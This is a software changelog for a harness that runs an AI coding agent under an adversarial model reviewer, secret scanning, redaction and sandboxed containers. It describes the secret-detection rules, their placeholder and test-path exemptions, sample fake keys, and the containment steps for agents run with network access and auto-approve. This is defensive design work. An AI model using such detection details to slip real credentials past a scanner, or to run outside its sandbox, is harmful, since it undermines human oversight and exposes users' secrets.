  set and had the model rewrite it from scratch, so a converged PRD's
  requirements never kept a stable code across cycles and every review round
  showed a brand-new set. A revision now updates a requirement in place
  (same id, same code — preserving its `derived_from`/`produced_by` graph
  edges) when the model's response cites the requirement's exact existing
  code, and only supersedes the requirements this cycle's response actually
  drops.
- **Two near-duplicate decisions asked with different wording across review
  rounds no longer create separate DEC rows.** Decision dedupe merges on
  text similarity alone (≥0.85 token Jaccard); a real re-run had the model
  re-ask the same choice with enough wording drift to fall short of that on
  its own each round. It now also merges when the question text is still
  recognizably the same subject (≥0.5 token Jaccard) AND the two decisions
  offer materially the same options (≥0.7 token Jaccard) — a same-subject
  signal that options rarely drift on even when wording does. Two decisions
  that merely share generic options (e.g. both a plain yes/no) but are about
  unrelated subjects still do not merge; the text floor guards against it.
- **The change-set adversarial reviewer's prompt now requires a concrete
  failure input.** A real run's one "high" finding on an already-`TrimSpace`d
  value ("whitespace manipulation") had no specific line, path, or input
  that would actually trigger it. Every finding must now cite the specific
  line/path and a concrete failure input or scenario; a speculative concern
  with no concrete trigger is at most low severity and advisory. Existing
  rigor gating (critical/high in-diff blocks, out-of-diff is advisory) is
  unchanged.

- **The secret sweep blocked ordinary feature code.** A generic "credential
  assignment" match — `"secret": "..."` in a `*_test.go` fixture, a comment
  naming a header's shape (`// X-API-Key: <id>:<secret>`) — and three
  example Stripe-shaped keys with obviously-fake bodies (`sk_live_...0000`,
  `...1111`, `...2222`) in a `config.json` all blocked, and `not_a_secret`
  only allowlists the exact (fingerprint, path) a human already saw, so it
  could not help the next file. Three independent mechanisms now apply
  (`internal/security`): a placeholder/low-entropy shape check (a 4+
  identical-character run, or Shannon entropy under 2.5 bits/char) excludes
  a match everywhere, for every provider-specific format as well as the
  generic rule; a placeholder-word/sequential-fill check, scoped to the
  generic rule only, excludes `example`/`test`/`dummy`/`fake`/`placeholder`/
  `changeme`/`xxx` and a value that IS essentially one long sequential run;
  and a generic-rule match in a `*_test.go`/`.spec.`/`.test.`/`test(s)`/
  `testdata`/`fixtures`/`__tests__` path is downgraded to advisory (visible,
  never blocking) rather than excluded outright. A comment/template
  placeholder (`<secret>`, `<id>:<secret>`, `${...}`, `{{...}}`) never
  matches at all. A provider-specific format or a configured secret value
  still blocks unconditionally, test path or not — see
  [`docs/security-model.md`](docs/security-model.md).
- **Dispositioning a reviewer false positive `rejected` blocked approval
  permanently.** Only `fixed`/`accepted_risk` cleared a blocking finding;
  `rejected` — a human's own "this finding is wrong" judgment — did not, so
  `approve --accept-findings` kept failing with a message recommending
  itself. `Finding.ResolvesBlocking` now also resolves a blocking finding
  when a HUMAN set `rejected` on a reviewer's own judgment call (no system
  deny code) — `EvaluateApproval` and `denyReviewOpenBlocking` both use it.
  A SYSTEM-set `rejected` (a failing build/test check, a secret_sweep or
  other deny-coded finding) is unaffected and keeps blocking exactly as
  before — "system deny beats human approve". `POST .../findings/{id}/
  disposition` now also returns a `warning` when `rejected` was recorded on
  a deny-coded finding that still blocks.
- **Reopening a decision could produce 0 stale items and an empty `/impact`
  for a requirement that plainly covered its subject**, while surfacing only
  requirements a later PRD revision had already superseded/removed. A
  superseded requirement keeps its old `derived_from` edge forever
  (`SupersedeRequirements` marks the row removed, it does not delete it or
  its edges); `decisionDependents` never filtered by requirement liveness,
  so a decision's reopen surfaced only long-dead requirements instead of
  whatever live one now covers its subject — it now skips a removed/
  superseded requirement, mirroring the filter `workflow.Impact` already
  applied. Separately, the requirement→decision wiring now also matches a
  requirement's `decision` reference against every decision on record for
  the initiative, not just the ones raised in the same PRD cycle, so a
  requirement regenerated in a later revise cycle that still names a
  standing (already-decided, not re-raised) decision gets wired to it.
- **Guidance for a change set the secret sweep denied said only "a check or
  the review found a problem it would not pass"** — true, but not the actual
  cause. `GET .../guidance` now names it when the rejection is a
  `secret_sweep` denial: the file (or "in the output of `<check>`") and kind
  of secret, never the value, plus the `not_a_secret` disposition route when
  the match is overridable. Separately, timeline copy read "a API key" —
  `indefiniteArticle` now picks "a"/"an" correctly across the secret-kind
  catalog, including the acronyms a naive vowel-letter check gets wrong in
  both directions ("an AWS ...", but "a URL ...").

- **Four backend fixes never reached the web UI** (release-gate review H8).
  A change set whose adversarial review never completed
  (`review_completed_at` unset) rendered the same Approve buttons as a
  normally-reviewed one, both of which the backend refuses unconditionally —
  the card now explains the state and offers "Re-run the review (costs a
  model call)" (`POST .../review {"verdict":"rerun"}`), the backend's own
  documented escape. A `reverted` change set rendered a pill and no buttons
  at all, though the backend already accepts re-apply from that status —
  it now offers "Re-apply". An applied `no_op` change set (zero file
  changes) read "SHIPPED", and Verify offered "Confirm all with passing
  tests" that the backend refused for every requirement — the pill now says
  "No file changes", and `hasBuiltSomething` (gating both Pass/Fail and the
  confirm button) no longer counts a no-op change set as something built.
  "Reject and re-run" started a fresh agent run even when the reject itself
  failed with a 409 (`runAction` used to swallow the error and always
  resolve); it now only runs when the reject actually succeeded.
- **`idea verify --json` exited 0 on an unmet gate** (release-gate review
  H10). `runVerify` returned the JSON payload before computing the
  `failOnUnmet` gate at all, so the only machine-readable form of this
  command could never fail — directly contradicting
  `docs/demo-greenfield.md`'s "an unmet gate exits non-zero, so `idea
  verify` is usable in a script." The JSON payload is unchanged; the gate
  now runs before returning, under `--json` exactly as it already did for
  the human-readable output.
- **`docs/quickstart.md` and `README.md` said, in bold, that no CLI verb
  resolves a decision or answers a question** (release-gate review H9) —
  true when written, false since the CLI judgment loop shipped
  (`idea answer`/`resolve`/`reopen-decision`/`accept-recommendations`/
  `triage`, above). Both now describe the real commands; dispositioning a
  review finding is still correctly described as web-UI/API only, since no
  CLI verb exists for that.
- **"Since you were last here" consumed the unread cursor on a fast
  in-and-out.** The M7 fix above (stamping on leaving an initiative, not
  only on entry) left the ENTRY stamp in place too, which advanced the
  cursor to "now" the instant an initiative was opened — before anything
  had actually been shown. Opening the wrong initiative in a long list and
  immediately leaving silently marked every entry since the previous visit
  as seen, irrecoverably. The cursor now advances only on leaving.
- **`groupTriage`'s defensive top-3 cap on "needs you" had no production
  caller.** `partitionByTriage` (DefinePage's actual per-category split)
  trusted every triage row marked `priority` unconditionally, so a backend
  that ever marked a 4th item priority would have grown "Needs you" past 3
  with nothing to catch it. `partitionByTriage` now derives its priority set
  from `groupTriage`'s capped list instead of the raw triage response.
  Separately, `hasConfirmableEvidence` (the Verify page's "is there anything
  to confirm" predicate) also had no caller — VerifyPage now uses it instead
  of recomputing the same rule inline.
- **`TestOnlySetKnownIncompatible`** (`internal/executor/compat.go`) mutates
  package-level state with no synchronization and was exported from the
  production build with only a doc-comment saying not to call it outside a
  test. It now panics via `testing.Testing()` when called from anything
  other than a test binary — three other packages' tests call it directly
  (Go does not link one package's `_test.go` files into another's build, so
  it cannot simply move into one), so this is the enforcement a file rename
  can't provide here.
- **The adversarial reviewer read the harness's own redaction as a syntax
  error and raised a blocking false-positive critical (ICP re-run 5, D1,
  High).** An advisory (test-fixture) secret in a diff shown to the reviewer
  was masked to `const [REDACTED]` — `RedactString`'s generic
  "credential assignment" pattern matches an identifier PREFIX before its
  keyword, so `AuthFixtureSecret = "<value>"` (the keyword "Secret" inside
  the identifier itself) pulled the identifier, `=` and quotes into the
  match, and `redact()` replaced the WHOLE match, not just the value. The
  reviewer, never told redaction happens, reported at `confidence: high`
  that the file "contains an invalid Go const declaration that will not
  compile, breaking the entire main package" — blocking approval — while
  `go build ./...` and `go test ./...` passed on the same change set and
  `gofmt -e` parsed the file cleanly. Fixed two ways: `redact()` now masks
  only the matched pattern's own capturing group (every catalog pattern's
  doc comment already promised this is what the group wraps), so
  `const AuthFixtureSecret = "[REDACTED]"` stays valid Go and reads
  unambiguously as a withheld value rather than an absent one; and the
  adversarial reviewer's own prompt now says plainly that credential-shaped
  values are masked before it sees the diff, that a `[REDACTED]` span is a
  withheld value and not missing/malformed source, and that it must not
  raise a finding about the syntax, validity or type of one. Prevention via
  the prompt plus a legible placeholder was chosen over a post-hoc
  finding-filter: the harness cannot know every way a model might phrase a
  "this doesn't parse" objection, but it can make the thing being objected
  to actually parse.
- **`idea review <id> rerun` exceeded the CLI's 60s HTTP timeout on every
  invocation (ICP re-run 5, D2, Medium).** The adversarial review it runs is
  a real model call — observed 1m12s–1m38s across four founder-journey
  observations — and used to run synchronously inside the HTTP handler
  (detached from the request's own cancellation, but not from the CLI's own
  `http.Client{Timeout: 60 * time.Second}`): the daemon always finished the
  review, but the CLI reported a timeout error every time, so a brand-new
  command of this release appeared to fail on every use even though the
  work always completed. `rerun` is now an async operation
  (`RerunChangeSetReviewInitiative`), the same 202 + `operation_id` shape
  `idea apply`/`idea execute` already use; the CLI waits on it by default
  (the same reasoning `idea retry` already waits by default: the command's
  entire job is completing a review, so a client-side timeout must never
  again be mistaken for the review itself failing), reports success once
  the operation actually succeeds, and understands `--no-wait`/`idea
  cancel`/`idea watch` like every other long-running command.
- **The adversarial review — the most expensive phase of `idea execute`,
  1–1.5 minutes — was never reported as its own stage (ICP re-run 5, D3,
  Low).** `setStage` was called for "Planning", "Agent running" and "Running
  checks", but not for the review that follows, so a polled operation's
  `stage` read "Running checks" for the review's entire duration even
  though the daemon log already recorded `stage=review` for it. Both call
  sites (`Execute`, `RerunChangeSetReview`) now call
  `setStage(ctx, initiativeID, "Running adversarial review")` first.
- **`idea changes` labelled a never-reviewed change set "needs your
  approval" (ICP re-run 5, D4, Low).** The same `review_required` status
  `idea status`'s guidance already, correctly, described as "never finished
  its adversarial review" (`domain.ChangeSet.ReviewCompleted`/
  `ReviewNeverCompletedCause`) — there is nothing to approve yet in that
  state, and `idea review <id> approve` refuses it and names `rerun`. The
  API's change-set list now carries `review_completed_at`, and `idea
  changes` uses the same wording `idea status` does whenever it is nil.
- **`idea execute` printed "✓ execute started" before a synchronous
  precondition guard could still reject the run (ICP re-run 5, D5, Low).**
  Several of Execute's own guards — another open change set, executor
  resolution, the trust-tier gate, a prior change set of the same task left
  mid-review or as an unresolved no-op — ran only inside the async
  `launchOperation` goroutine, strictly after the daemon had already
  answered 202 and the CLI had already printed its success line; a
  real founder-journey run hit exactly this (a task whose only change set
  never finished its adversarial review) and it failed in under a
  millisecond, at zero model cost, immediately after the "started" line
  printed. `Engine.ExecutePrecondition` now runs the same read-only checks
  synchronously, before the operation is ever created, so a run this cheap
  a guard would refuse anyway is refused synchronously with nothing printed
  as having started; Execute's own copies remain the backstop for the race
  window between the two.
- **`idea tasks --json` omitted `requirement_ids` and `depends_on`** even
  though `GET .../tasks` has always returned both (ICP re-run 5 gap): the
  CLI's `cliTask` DTO simply dropped them, so a script had no way to see a
  task's requirement traceability or dependencies short of raw HTTP — which
  is exactly what the evaluator had to fall back to for plan edits, since
  there is no CLI verb for add/merge/split/depends-on/reorder either (see
  `docs/plans/deferred.md`). Both fields are now on `cliTask` and reach
  `idea tasks --json` unchanged.
- **`idea pr` dumped a raw git error on a repository with no remote
  configured** (ICP re-run 5 gap): `pushRemote`'s "origin" fallback named a
  remote that did not exist, so `git push -u origin <branch>` failed with
  git's own unclassified text ("'origin' does not appear to be a git
  repository"). `pushRemote` now checks the remote actually exists before
  ever shelling out to `git push`, and a push that still fails on a
  missing-remote message (a branch's own `branch.<name>.remote` naming a
  remote since removed) is classified the same way; both surface as a new
  `git.ErrNoRemote`, reported as "this repository has no remote configured;
  add one (e.g. `git remote add origin <url>`) and push the branch, then
  run `idea pr` again" rather than git's raw output.

### Fixed — whole-branch adversarial review follow-up (MEDIUM/LOW backlog)

- **Migration 34's `no_op` default is now backfilled for pre-migration change
  sets**, not left at its conservative `false` forever. The patch manifest was
  persisted unconditionally before that migration existed, so the true file
  count is one blob read, not lost — done once per project, at daemon start
  (not inside the migration itself, which is plain SQL text with no blob-store
  access), gated by a persisted `project_state` marker so it never re-scans.
- **Migration 33's "never finished its adversarial review" messages
  no longer call a pre-upgrade row "likely cancelled mid-review."** Before the
  upgrade, `review_completed_at` didn't exist and nothing was cancelled; a
  change set's `PredatesReviewTracking` (compared against when migration 33
  itself was applied to this database) now picks the right explanation on all
  four surfaces: Execute's re-pick refusal, the approve refusal, `GET
  .../guidance`, and `applyStateMessage`.
- **`PATCH .../tasks/reorder` no longer answers `requirement_ids`/`depends_on`
  as `null`** — it now calls `AttachTaskEdges` like every other task response.
  `TestResponsesMatchTheirDeclaredSchema` now also drives PATCH/POST
  plan-editing endpoints, not only GETs.
- **The catch-up commit (`git.branch_per_initiative`) no longer sweeps a
  user's own hand-edit into a commit titled as the harness's own catch-up**:
  each catch-up path's on-disk content is checked against the digest the
  recorded change set actually wrote there, and the branch switch refuses
  (naming the stale path) rather than committing drifted content. Separately,
  if the change set's own commit fails after `checkout -b` already switched
  the workspace onto the initiative's branch, the branch is now restored to
  what was checked out before, instead of leaving the workspace stranded
  there alongside the reported failure.
- **Decision dedup's same-subject text floor is now a strict `>`, not `>=`.**
  "Which database should we use?" vs. "Which cache should we use?" — the
  canonical kept-apart pair this code and this file's own history already
  cite at Jaccard 0.5 — merged anyway whenever the two decisions also
  happened to offer near-identical options, because the floor comparison let
  a text similarity of exactly 0.5 fall through to the options check.
- **A renamed provider's context window is resolved correctly again.**
  `model.ContextWindowFor`'s tables are keyed on the six built-in provider
  names; a `providers:` entry renamed to something else (`providers:
  openai-work:`, this project's own documented example) now resolves via its
  base URL against the built-in presets (`config.PresetForBaseURL`) instead
  of returning 0 and reproducing the Hermes-refuses-to-start-below-64k
  failure the context-length fix exists to prevent.
- **`demo.block_review_cycles`'s clamp to `review.max_cycles` no longer skips
  itself when some other `review.*` field is configured.** `max_cycles`'s
  raw value can legitimately sit at `0` (unset) while still being enforced as
  3 by the engine; the clamp now uses `ReviewConfig.EffectiveMaxCycles()` —
  the same effective value the engine itself computes — instead of the raw
  field.
- **`docs/configuration.md` corrections:** `executor.image`'s `alpine:3.20`
  default is per-`executor.kind` (`container` only; `hermes` defaults to the
  pinned Hermes image; `omp` has none and refuses every execute); a `.env`
  edit is never picked up by the daemon's harness.yaml-mtime auto-reload on
  its own; and a brand-new `git.branch_per_initiative` branch is created from
  current HEAD (not the repository's default branch) whenever HEAD has
  diverged from that default, not never.
- Sandbox `/tmp`/`/tmp/cache` tmpfs mounts keep `nodev` alongside `exec`
  (dropped in the same change that added `exec`).
- The daemon's HTTP server now sets `ReadHeaderTimeout`/`ReadTimeout`/
  `IdleTimeout` (10s/30s/120s) so a stalled client can no longer tie up a
  connection indefinitely; `WriteTimeout` is deliberately left unbounded so
  it never cuts `GET .../events`'s SSE stream.
- `store.ErrDependsOnCycle`/`ErrSelfMerge`/`ErrMergeCycle` — the three
  sentinel errors whose `Error()` text a handler surfaces verbatim in a 400
  body — no longer carry the package's internal `store: ` prefix into that
  response. `docs/openapi.yaml`'s merge/split `400` descriptions now also
  name every cause the handlers actually return, not just the first one.
- Single-sourced two duplicated helpers: `internal/domain.TrimToWordBoundary`
  is now the one word-boundary-cut implementation (`internal/projection`'s
  `truncateWords` wraps it and adds only the ellipsis GenerateShortTitle
  deliberately doesn't want); `store.ListStaleItems`/`ListAllStaleMarks`
  share one query+scan helper instead of a 35-line duplicate differing only
  in one `WHERE` clause.
- Fixed the flaky `TestClientTimeoutNamesTheActionAndHowToCheck`
  (`internal/cli`): the hanging listener's accepted connection is now kept
  referenced (and explicitly closed in `Cleanup`) instead of discarded, so
  its finalizer can no longer close the socket — sending the client an
  unexpected RST instead of the deadline-exceeded timeout the test expects —
  before the 50ms client timeout fires.
- `docs/security.md` now lists the redactor's actual full pattern catalog
  (it previously named roughly a third of it), cross-checked against
  `internal/security.credentialCatalog` by a new test so the two cannot
  silently drift apart again; `docs/security-model.md` now documents
  `isPlaceholderShape`'s 200-character scope explicitly (applies to short,
  flat values; a long match like a PEM block or JWT is exempt, never the
  reverse).

## [0.5.1] - 2026-09-18

### Added

- **Run the coding agent's smoke test from Settings.** The daemon runs it with its
  own configuration and keys, so it tests what a real run will use. `idea
  executors setup --smoke` ran it in the CLI's environment, which is not always
  the daemon's. The last result stays on the page.
  `POST /api/v1/projects/{projectId}/executors/smoke`; `status.last_smoke` on
  `GET …/executors`.
- **Live agent output on the running card**: the last 100 lines, redacted,
  while the agent runs. `GET …/initiatives/{id}/agent-output`.
- **`DELETE …/initiatives/{id}/partial-work`** ("Start over"), `partial_work` on
  `GET …/guidance`, and the `carried_over` finding category.
- **What the agent printed stays readable after the run.** The running card
  showed it live and disappeared with it when the run finished; each change set
  now keeps the agent's last 100 lines (`agent_output`, redacted) under a
  collapsible "Agent output", and a stopped run's card keeps what it last
  showed.

### Changed

- **Running a task again after Stop continues from the files the agent had
  written**, instead of starting from nothing. It is the same after a failure,
  a timeout or a daemon stop. Kept files are carried only where the workspace
  has not changed since, and the change set lists them. The Run button says
  so. "Start over" gives the old behaviour.

## [0.5.0] - 2026-09-17

### Changed — BREAKING

| | Was | Now |
|---|---|---|
| `PUT …/executors` with a model the coding agent cannot use (unknown provider, a provider name Hermes rejects, an Anthropic-type proxy) | stored; the run failed later | `400` with the reason |
| `POST …/execute` while the PRD or the plan is waiting for review (`needs_human_judgment` with `prd_review`, `plan_review` or `plan_dependencies`) | ran tasks from an unapproved plan, leaving approve-plan and revise-plan both refused | refused: approve the PRD and plan first |
| `POST …/execute` while another task's change set in the initiative is open (`checks_running`, `review_required`, `approved`, `applying`, `changes_requested`, `conflicted`) | ran, on a copy that lacked the open change set's work | refused, naming the open change set |
| `GET …/initiatives/{id}/decisions` | every row | one row per question (newest open, else newest decided); `?all=true` returns every row |
| `POST …/decisions/{id}/resolve` | resolved that decision | also resolves open decisions of the same type asking the same question, when they offer the same answer |
| Ollama with no `default_model` | `llama3.1` | `qwen3.8` |
| A second `idea daemon` on another address sharing the same state directory | started | refused: the state directory is locked |

Consumer impact: automation that saves an executor with an unresolvable model,
runs tasks back to back without applying or rejecting each change set, or
counts decisions, will see a refusal or fewer rows. Ollama users relying on
the default must `ollama pull qwen3.8` or set `default_model: ollama/llama3.1`.

### Added

- **API fields for the web UI's Build and Settings pages** (all omitted when
  empty):
  - operations: `error`, the redacted reason a failed operation failed;
  - `GET …/guidance`: `next_task` and `run_blocked_reason`;
  - `GET …/executors`: `status` (`image`, `image_present`, `image_state`,
    `key_env`, `key_set`, `problem`, `note`);
  - change-set diff files: `patch` (git-style hunks) and `patch_note`;
  - change sets: `model` and `executor`;
  - `GET …/decisions?all=true`;
  - finding categories `stale_base`, `workspace_copy` and `agent_output`.
- **Patch manifests record `base_digest`** for modified and deleted files, so
  apply can refuse a stale base. Patches made before this apply as before.

- **A CI job that runs the real agent path without an API key.** It starts the
  pinned image through the real executor against a refused endpoint and asserts
  Hermes accepted the query. Both startup defects above fail it; neither needed
  a key to detect. It runs on pushes rather than every pull request because the
  image is 5.4 GB, and releases now wait for it.

### Changed

- **Current default models.** The model a provider defaults to when you set only
  its key is now one that answered a real call on 2026-09-17:
  `claude-sonnet-5` (was `claude-sonnet-4-5-20250929`), `gpt-5.6-luna` (was
  `gpt-4o`), `deepseek-v4-pro` (was `deepseek-chat`),
  `anthropic/claude-sonnet-5` on OpenRouter (was `openai/gpt-4o`), and `qwen3.8`
  on Ollama (was `llama3.1`). **If you use Ollama without a `default_model`**,
  the harness now asks for `qwen3.8`: pull it (`ollama pull qwen3.8`), or set
  `default_model: ollama/llama3.1` to keep the old one. Newer models were added to each provider's
  catalog: Claude Opus 5 and Fable 5.1, GPT-5.6 and 5.5, Gemini 3.5 to 3.8,
  DeepSeek V4, and Qwen 3.8, Kimi K3 and GLM 5.3 on OpenRouter.

- **Retired model ids were removed from the catalog**, because each returned 404
  on 2026-09-17: `claude-3-7-sonnet-latest`, `claude-3-5-haiku-latest`,
  `claude-opus-4-1`, `gemini-2.0-flash`, `gemini-1.5-pro` and OpenRouter's
  `anthropic/claude-3.7-sonnet`. Setting one now prints the catalog warning,
  which lists the current ids. The model is still accepted.

- **`idea daemon stop` waits for the daemon to exit** (up to 35 s, while it
  cancels running work) and prints the pid it stopped; it exits non-zero if
  the daemon is still stopping.

### Fixed

- **The web UI can run the whole loop.** The UI walkthrough rated it 3/10:
  nothing in the browser could start Build, and a failed run left no trace.
  - **Build** has a "Run TASK-n: title" button, disabled with the reason when a
    run cannot start (another change set is still open, Docker is not running,
    the provider's key is not set). A failed run shows the agent's own error
    with Retry. The running card names the task; Stop offers to run again.
  - **Diffs** show only the changed lines, with context, labelled added,
    modified or deleted, or say why there is no diff (binary, too large, or
    the file was edited after the agent ran). Every finding on a change set is
    shown before you approve, including why a change set conflicted, with
    "Reject and re-run" first when retrying cannot work.
  - **Approve, Apply, Revert** show that they are working and report errors
    inline; approving finishes even if you close the tab.
  - **Settings** shows whether the agent's image is pulled and its key is set,
    stores the Hermes image when you leave it empty (an empty image had run
    `alpine:3.20`, which has no agent), and rejects a model it cannot use with
    the reason. The model picker loads on open, leads with current models and
    hides speech, image and embedding models. The page no longer re-renders in
    a loop, which had called the provider's model API several times a second.
  - **Define** shows PRD decisions and findings; **Plan** shows the plan's,
    including a dependency cycle that blocks approval and had shown nowhere.
    "Revise PRD" appears only when the PRD is what is waiting. The same
    question asked twice shows once, and answering it answers both.
  - **Demo mode** has a banner on every page, its output is labelled a
    placeholder, and nothing demo-made is called "SHIPPED".
  - **Errors** read as the server's message, not raw JSON; a missing key names
    the variable and turns the sidebar dot amber. The lost-connection banner
    appears only for a real network failure and keeps the page visible.
  - **Phone widths** keep the navigation and wrap Plan and Settings rows;
    dark mode covers form fields; unknown links show a not-found page.
  - `idea dev`, `idea init` and `idea daemon status` print the UI address;
    `idea daemon stop` prints the pid it stopped.

- **Applying a change keeps file permissions.** It wrote through a private
  temporary file, so a 0644 file became 0600 and a script lost its executable
  bit.

- **A provider's model list is fetched at most every five minutes** instead of
  on every page poll, each of which called the provider's API with your key.

- **The coding agent no longer overwrites your files.** Its working directory
  started empty, so the agent never saw the project: asked to add a route to
  `server.js`, it wrote a new `server.js` from nothing, the change set called
  the file "added", and applying it deleted the routes that were there. Each
  run now starts from a fresh copy of the project (git's tracked and untracked,
  non-ignored files). `.env` files and any file that looks like it holds a
  credential are never copied, because the agent runs with network access;
  everything left out is listed on the change set. Applying now refuses, and
  marks the change set conflicted, when a file it changes was edited after the
  agent ran or a file it adds now exists. The next task in an initiative waits
  until the previous task's change set is applied or rejected, so it starts
  from those changes.

- **The Hermes coding agent generates real code.** It never could against the
  pinned image `nousresearch/hermes-agent:v2026.5.16`, for three independent
  reasons, and nothing noticed because the only CI job that exercised the path
  runs on manual dispatch only.

  | | Was | Now |
  |---|---|---|
  | Invocation | `hermes --in /work --yolo chat --query … --model …` — Hermes has no `--in` flag, printed its usage and exited | `hermes chat --yolo -q … -m <model> --provider <slug>` |
  | Container start | `--read-only` with a host `--user` left the entrypoint unable to create its home: `mkdir: cannot create directory '/opt/data': Permission denied`, and nothing ran | a per-attempt agent home, mounted read-write, named by `HERMES_HOME` |
  | `idea executors setup` | reported `"hermes" CLI not found in image` for the image it had just downloaded, because the probe bypassed the entrypoint that puts `hermes` on `PATH` | the probe runs through the entrypoint |
  | Finished runs | a fast agent deleted itself (`--rm`) between status polls, so a run that succeeded reported `failed (removing)` | the container is named, and removed when the attempt is collected or cancelled, when `docker run` fails after creating it, when the daemon is stopped, and at the next daemon start after a crash |

  `idea executors setup --kind hermes --model <provider/model> --smoke --yes`
  now passes for all six providers — OpenAI, Anthropic, Gemini, DeepSeek,
  OpenRouter and Ollama — each producing a real file on 2026-09-17 with the new
  default models below.

- **The agent talks to the provider you configured.** Hermes's own provider
  names do not match this project's: it maps `openai` to OpenRouter and does not
  know `ollama`, so an OpenAI key would have gone unused while OpenRouter was
  billed. The agent now receives a generated config declaring the provider
  explicitly, with the base URL and the name of its key variable. Both are
  resolved the way every other model call resolves them: a `providers:` entry
  in `harness.yaml` first, then the built-in preset. So an Ollama on another
  port, or a key in a project-specific variable, reaches the agent too. Without the key variable, Hermes sent the literal placeholder
  `no-key-required`, which is why Anthropic, Gemini and DeepSeek were rejected
  with keys that were valid on the host.

- **Keyless providers can run the coding agent.** The executor refused any
  provider without a key variable, which could not distinguish Ollama — a preset
  that needs no key — from a typo. An unresolvable provider still fails closed,
  including when `default_model` is set: only a bare model id takes the default
  model's provider, so `opneai/gpt-x` is refused rather than sent to OpenAI.
  Ollama is reached through `host.docker.internal`, because inside a container
  `localhost` is the container.

- **Gemini's agent endpoint and default model.** The agent speaks the
  OpenAI-compatible protocol, so it uses Google's compatible endpoint rather
  than the native API idea-harness itself calls. And `gemini-2.5-flash`, the
  catalog's Gemini default, now answers 404 "no longer available to new users"
  on both APIs while still appearing in Google's model listing. The default is
  `gemini-3.6-flash`, verified on both. The engine falls back to that default
  when a user has only `GOOGLE_API_KEY` set, so every model call had been failing
  for a new Gemini user.

- **A keyed provider with no key stops before the agent starts**, naming the
  variable. The key is read from the daemon's environment and then the
  project's `.env`, as every other model call reads it; the agent used to read
  only the environment. Before, the agent started keyless, got a 401, exited 0,
  and the run produced an empty change set with no reason given.

- **`idea daemon stop` no longer strands running agents.** The daemon exited at
  once on SIGTERM, so a running agent container kept going with the provider key,
  network access and auto-approve. The daemon now stops accepting requests,
  cancels running operations, and waits up to 30 seconds for them to remove
  their containers; `idea daemon stop` waits for it to exit. It also removes its
  pidfile, which a stop used to leave behind, and only if it is still its own.
  The next daemon start removes anything a killed daemon left before it starts
  any run; if Docker cannot be reached yet, the record is kept for the start
  after. A second `idea daemon` now fails on the taken address before touching
  anything, and two daemons can no longer share one state directory. Ctrl-C during `idea executors setup --smoke` now removes
  the smoke's container too.

- **`idea execute` checks the provider before it spends.** The key and provider
  checks ran after the planner's model call and after the previous change set
  was superseded, so a refused run cost money and discarded the change set being
  redone.

- **A failed agent says why, in `--smoke` and in `idea execute`.** Hermes exits
  0 even when the model call fails, so a failure surfaced as `produced no files
  (CLI contract mismatch?)` in the smoke, and in a real run as `attempt failed`
  or as an empty change set with no reason. Both now carry the last 40 lines of
  the agent's own output, which name the 401 or the dead model id, with known
  secrets redacted, escape sequences stripped and the size capped. A run in
  which the agent changed no file still produces its (empty) change set, but now
  with a finding that says so and carries the agent's output, so the review
  shows why. It is not a hard failure, because a task the agent finds already
  done legitimately changes nothing.

- **`max_cost_usd` is enforced at current prices.** Every current model was
  missing from the price table and was budgeted at the $0.50/$2.00 default:
  `claude-sonnet-5` at a quarter of its rate, `claude-fable-5-1` at a twentieth.
  Every catalog model now has a price, taken from OpenRouter's published rates on
  2026-09-17, and a test fails when a catalog model has none. A model is priced
  by its own row, or a row plus a date or release suffix, never by a family
  prefix: `gpt-5.4-pro` had been charged as `gpt-5`, eighteen times under, and
  `o3-pro` at the default, forty times under. A model called through OpenRouter
  now costs the same as the same model called directly. Calls to a local model
  (Ollama, or any provider on `localhost`) cost nothing; they had been charged
  at the default rate.

- **`idea executors setup` checks the provider before pulling a 5.4 GB image**,
  and lists the providers it accepts. It also refuses a provider the daemon
  reports a problem with, and `--smoke` now calls the provider as the daemon
  resolved it, so a custom provider can be smoked. It reads the key from the
  project's `.env` as the daemon does, refuses a provider name or type the agent
  cannot use (an uppercase name, an Anthropic-type proxy), and warns when
  `models.implementer` would run a different model than the one set.

## [0.4.0] - 2026-09-17

### Changed — BREAKING

- **`idea status` exits non-zero when the newest initiative has failed, and
  `--json` carries `failure_reason`.**

  | | Was | Now |
  |---|---|---|
  | `idea status` with a failed newest initiative | printed `● failed` and the provider's full error, exit **0** | same output, exit **1**, the reason on stderr |
  | `idea status --json` on a failed initiative | `[{"id","title","status"}]` | the same, plus `"failure_reason"` |
  | `idea status` with an *older* failed initiative and a healthy newest one | exit 0 | exit 0 — unchanged |
  | `idea status` on `needs_human_judgment` | exit 0 | exit 0 — unchanged |

  **Any script that branched on `idea status`'s exit code saw success
  unconditionally, and any script that relied on that will now stop.** A script
  running it as a health check could not previously tell that an initiative had
  failed, and the machine path was strictly less informative than the human one
  about the only thing that matters.

  Two deliberate limits. `needs_human_judgment` is *not* a failure: waiting on a
  person is the loop working, and treating it as an error would make the whole
  judgment path exit non-zero. And the code reflects only the **newest**
  initiative — the one every other command means by "the initiative" — because
  scanning all of them made the exit sticky: one abandoned experiment gated the
  project's overview command forever, with nothing a user could do to clear it.

  The full exit-code taxonomy remains deferred (audit 8 / E2).

- **Two API state guards: `revise-plan` refuses a plan whose work has started,
  and three endpoints refuse a field they do not declare.** Both are the
  same shape — a check that existed, applied to one caller and not to the path
  that matters.

  | | Was | Now |
  |---|---|---|
  | `POST …/revise-plan` with ≥1 change set | **202**, then the initiative went `failed` asynchronously | **409** `cannot revise a plan that already has change sets` |
  | `PUT …/providers`, `PUT …/executors`, or `POST …/change-sets/{id}/review` with an undeclared field | **200** (`{"status":"updated"}` / `{"status":"reviewed"}`), field silently dropped | **400** naming it, e.g. `json: unknown field "api_key"` |
  | `PUT …/providers` with a provider that resolves to no endpoint | **200**, stored, failing at the first model call | **400** naming the missing `base_url` |
  | `idea doctor`, `idea config validate`, `idea model add` on a `harness.yaml` that already contains such an entry | exit **0** (`valid (with warnings)`) | exit **1**, naming the entry |

  **Migration.** All three now use `decodeStrict`, so a client must send only the
  fields the operation declares. `POST …/change-sets/{id}/review` takes
  `verdict` and `accept_findings` and nothing else — a body carrying
  `acceptFindings` (camelCase) or any extra key is now a 400 rather than a
  silently-dropped field. The two config endpoints are **not** round-trippable
  from their own `GET`: `GET …/providers` returns `demo`, `models` and
  `git_commit` alongside the writable fields, and `GET …/executors` is a
  catalog of all four executor kinds rather than a projection of the config, so
  neither response can be edited and sent back verbatim.

  That last row is a break for existing configs, not just for new writes: the
  predicate lives in `config.ValidateProvider`, which feeds `providerProblems`
  at error severity, so `idea doctor` — the README's post-install check — now
  fails on a project that passed yesterday. It is the right place for it
